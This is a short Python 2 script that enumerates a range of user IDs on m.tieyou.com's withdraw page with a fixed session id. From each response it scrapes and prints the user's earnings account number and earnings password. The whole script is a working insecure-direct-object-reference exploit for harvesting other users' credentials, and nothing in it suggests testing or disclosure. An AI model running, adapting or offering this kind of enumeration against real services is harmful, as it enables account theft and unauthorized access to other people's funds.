#encoding: utf-8 
import sys
import requests
import re

for num in range(53604661, 53604761):
#http://m.tieyou.com/index.php?param=/imgGame/withdraw.html&uid=53604661&r=1456724158&sid=f7b79e4f27957446e661d0c0c18b94c7&rid=0.04937207163311541
    r = requests.get('http://m.tieyou.com/index.php?param=/imgGame/withdraw.html&uid={0}&r=1456724158&sid=f7b79e4f27957446e661d0c0c18b94c7&rid=0.04937207163311541'.format(num))
    re_sy_pattern = re.compile( r':\s?\w{6}<',re.IGNORECASE | re.DOTALL | re.MULTILINE)
    re_result = re_sy_pattern.findall(r.text)
    print '收益号:',':',re_result[0][2:8],'收益密码:',':',re_result[1][1:7]
